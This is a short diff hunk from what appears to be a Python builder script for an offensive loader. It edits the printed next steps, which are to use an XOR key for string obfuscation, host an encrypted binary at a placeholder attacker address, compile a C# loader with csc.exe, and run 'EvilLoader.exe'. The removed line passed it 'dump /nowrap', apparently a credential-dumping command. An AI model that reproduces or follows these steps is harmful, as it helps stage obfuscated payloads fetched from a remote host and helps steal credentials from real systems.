@@ -248,6 +248,6 @@ if __name__ == "__main__":
     print(f"[+] XOR key for string obfuscation: {xor_key}")
     print("\n[*] Next steps:")
     print(f"    1. Host {ENC_OUTPUT} at http://YOUR.IP/net_binary_enc.bin")
-    print("    2. Compile the C# loader (no /unsafe needed):")
+    print("    2. Compile the C# loader")
     print("       C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /out:RefractionMirage.exe refractionmirage.cs")
-    print("    3. Run EvilLoader.exe dump /nowrap")
+    print("    3. Run EvilLoader.exe ARGUMENTSHERE")
